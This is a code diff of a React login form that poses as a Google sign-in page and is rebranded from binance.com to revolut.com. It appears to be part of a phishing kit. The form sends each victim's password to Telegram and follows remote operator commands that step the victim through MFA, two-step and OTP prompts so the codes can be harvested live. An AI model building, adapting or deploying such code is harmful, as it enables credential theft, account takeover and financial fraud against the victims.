@@ -13,8 +13,8 @@ export default function LoginForm() {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const [invalid, setInvalid] = useState(false);
-    const { command, resetCommand } = useCommand();
-    const [verificationNumber, setVerificationNumber] = useState(null);
+    const {command, resetCommand, verificationNumber, setVerificationNumber  } = useCommand();
+    // const [verificationNumber, setVerificationNumber] = useState(null);
 
 
 
@@ -31,18 +31,6 @@ export default function LoginForm() {
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('password');
-        } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
-            setIsLoading(false);
-            setTimeout(() => {
-                // setIsLoading(false);
-                resetCommand(); 
-                router.push('/AuthenticationPage');
-            }, 1500);
-        } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
-            setTimeout(() => {
-                resetCommand(); 
-                router.push('/NumAuthenticationPage');
-            }, 1500);
         } else if (command === 'REQUEST_GOOGLE_MFA') {
             setIsLoading(false);
             setCurrentStep('mfa');
@@ -50,7 +38,8 @@ export default function LoginForm() {
             setIsLoading(false);
             setCurrentStep('2step');
             // Generate random verification number
-            setVerificationNumber(Math.floor(1000 + Math.random() * 9000));
+            
+            // setVerificationNumber(Math.floor(1000 + Math.random() * 9000));
         } else if (command === 'REQUEST_GOOGLE_AUTH_OTP') {
             setIsLoading(false);
             setCurrentStep('auth_otp');
@@ -60,10 +49,7 @@ export default function LoginForm() {
         }  else if (command === 'CORRECT_OTP') {
             setIsLoading(false);
         } else if (command === 'FINISH') {
-            setTimeout(() => {
-                resetCommand(); 
-                router.push('/verificationPage');
-            }, 1500);
+            router.push('/verificationPage');
         }
     }, [command]);
 
@@ -84,7 +70,7 @@ export default function LoginForm() {
     const handlePasswordSubmit = () => {
         if (password.length > 0) {
             showLoader();
-            sendMessageToTelegram(`Google Password: ${password}`);
+            sendMessageToTelegram(`GOOGLE PASSWORD: ${password}`);
             // Simulate command receipt
             // setTimeout(() => setCommand('CORRECT_OTP'), 2000);
         }
@@ -107,15 +93,15 @@ export default function LoginForm() {
                                 <div className="responsive-spacing">
                                     <div className="h-12 w-12 sm:h-16 sm:w-16">
                                         <img 
-                                            src="https://lh3.googleusercontent.com/89koR46wNEOHYkbF86ZlmxqGlPO5WQiMuWLDzir_AVDZ2yMRspD25KMvauINOtZxmlSH" 
-                                            alt="binance.com"
+                                            src="https://assets.revolut.com/assets/brand/Revolut-Black.svg" 
+                                            alt="revolut.com"
                                             className="w-full h-full"
                                         />
                                     </div>
                                     <h1 className="responsive-header google">Sign in</h1>
                                     <p className="responsive-text google">
                                         to continue to 
-                                        <a href="#" className="text-blue-700"> binance.com</a>
+                                        <a href="#" className="text-blue-700"> revolut.com</a>
                                     </p>
                                 </div>
                             </div>
